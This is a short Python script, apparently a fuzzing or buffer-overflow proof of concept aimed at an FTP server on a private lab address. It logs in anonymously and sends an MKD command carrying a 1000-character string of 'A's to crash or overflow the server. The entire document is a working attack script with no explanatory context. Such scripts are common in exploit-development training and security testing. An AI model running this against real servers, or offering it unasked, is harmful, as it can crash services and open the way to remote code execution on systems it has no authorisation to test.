import socket
import sys

evil = 'A' * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.227.1', 21))

s.recv(1024)
s.send('USER anonymous\r\n'.encode())
s.recv(1024)
s.send('PASS anonymous\r\n'.encode())
s.recv(1024)
s.send(('MKD ' + evil + '\r\n').encode())
s.recv(1024)
s.send('QUIT\r\n'.encode())
s.close()

